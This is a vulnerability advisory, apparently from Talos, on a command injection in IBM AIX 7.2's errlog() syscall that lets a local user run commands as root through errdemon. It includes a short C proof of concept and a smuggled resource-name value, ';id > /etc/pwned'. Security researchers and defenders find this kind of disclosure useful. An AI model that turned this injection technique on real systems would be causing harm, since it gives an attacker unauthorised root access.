# Talos Vulnerability Report

### TALOS-2023-1690

## IBM Corporation AIX errlog() Log Injection Vulnerability

##### April 24, 2023

##### CVE Number

None,CVE-2023-26286

##### SUMMARY

An OS command injection vulnerability exists in the errlog() syscall functionality of IBM Corporation AIX 7.2. A specially crafted syscall can lead to execute privileged operation. An attacker can execute arbitrary commands to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

IBM Corporation AIX 7.2

##### PRODUCT URLS

AIX - <http://us.ibm.com>

##### CVSSv3 SCORE

5.5 - CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N

##### CWE

CWE-117 - Improper Output Neutralization for Logs

##### DETAILS

AIX is a series of proprietary Unix operating systems developed and sold by IBM for several of its computer platforms.

Research into the attack surface presented by the `errlog()` syscall has identified 3 potential areas of concern.

It should be noted that these events will likely be onboarded into the system operator’s wider monitoring infrastructure. Being able to inject arbitrary events will allow attackers to actively mislead defenders as to the current operational state of the platform.

#### Malformed input leading to memory corruption

Certain combinations of values supplied in the `err_rec` structure via the `error_id`, `resource_name` and `detail_data` properties to the `errlog()` syscall can result in out-of-bounds memory access when the events are processed by the errdemon process.

#### CVE-2023-26286 - Malformed input leading to direct command injection

The most critical vulnerability can be triggered using the example code to generate an error with an ID of `ERRID_CORRUPT_LOG` with a `resource_name` of `;id > /etc/pwned`. The resource name is used by `errdemon` to process events that have been written to `/dev/error`.

As can be seen in the snippet below, taken from a truss-based recording of the errdemon process’s activity, the supplied resource name value is used to construct the command passed into `execve()`. This results in it being executed as the root user:

execve(“/usr/bin/sh”, …);

argv: sh -c /usr/lib/physloc ;id > /etc/pwned

#### Exploit Proof of Concept

The most trivial method of exploitatation to gain command execution takes the following form:

int main(int argc, char \*\*argv) {
struct err\_rec mal\_vec;
mal\_rec.error\_id = ERRID\_CORRUPT\_LOG; // this can be any valid error ID that has been registered, but the choice can affect how it is processed by errdaemon
strcpy(mal\_rec.resource\_name, argv[1]);
errlog((void \*) &mal\_rec, sizeof(unsigned int) + ERR\_NAMESIZE);
}

Once the event has been submitted with `errlog()`, it is then exposed on `/dev/error` for processing.

For example:

./logpop “;id > /etc/pwned”

This results in `/etc/pwned` being created with root privileges and populated with the output of the `id` command when the event is processed by `errdemon`.
